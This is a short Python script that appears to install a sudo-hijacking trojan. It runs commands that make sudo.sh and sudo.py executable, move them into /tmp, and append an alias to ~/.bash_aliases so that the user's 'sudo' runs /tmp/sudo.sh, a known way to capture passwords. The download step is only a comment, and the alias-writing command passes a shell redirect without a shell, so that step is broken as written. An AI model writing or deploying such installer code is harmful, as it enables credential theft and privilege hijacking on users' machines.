import subprocess

# Download .sh files code
#
#
# --------------------------
all_commands = ["chmod +x sudo.sh","mv sudo.sh /tmp/sudo.sh","chmod +x sudo.py","mv sudo.py /tmp/sudo.py","printf \"\\nalias sudo='/tmp/sudo.sh'\\n\" >> ~/.bash_aliases"]

for i in all_commands:
    subprocess.run(i.split(" "))

